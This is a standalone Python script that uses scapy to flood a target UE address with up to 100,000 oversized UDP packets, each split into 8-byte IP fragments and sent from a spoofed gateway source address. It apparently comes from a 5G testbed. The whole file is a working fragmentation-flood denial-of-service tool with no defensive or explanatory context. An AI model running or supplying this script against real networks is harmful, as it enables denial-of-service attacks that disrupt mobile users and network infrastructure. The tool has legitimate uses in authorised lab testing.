#!/usr/bin/env python3
from scapy.all import IP, UDP, send, fragment
import random
import time

TARGET_IP = "10.45.0.32"  # Target UE IP
MAX_PACKETS = 100000

packet_count = 0
while packet_count < MAX_PACKETS:
    # Craft a large UDP packet to fragment
    pkt = (
        IP(src="10.45.0.1", dst=TARGET_IP) /
        UDP(sport=random.randint(1024, 65535), dport=8080) /
        ("X" * 2000)  # Large payload to ensure fragmentation
    )
    # Fragment the packet into 8-byte chunks
    fragments = fragment(pkt, fragsize=8)
    # Send fragments with a slight delay
    for frag in fragments:
        send(frag, verbose=0)
    packet_count += 1
    if packet_count % 10 == 0:
        print(f"Sent {packet_count} fragmented packets")
    time.sleep(0.01)

print(f"Sent {packet_count} fragmented packets.")